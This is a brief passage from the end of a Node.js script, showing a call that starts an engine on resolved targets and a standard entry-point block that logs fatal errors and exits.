    engine.start(resolvedTargets);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\x1b[31m[FATAL]\x1b[0m', err);
        process.exit(1);
    });
}
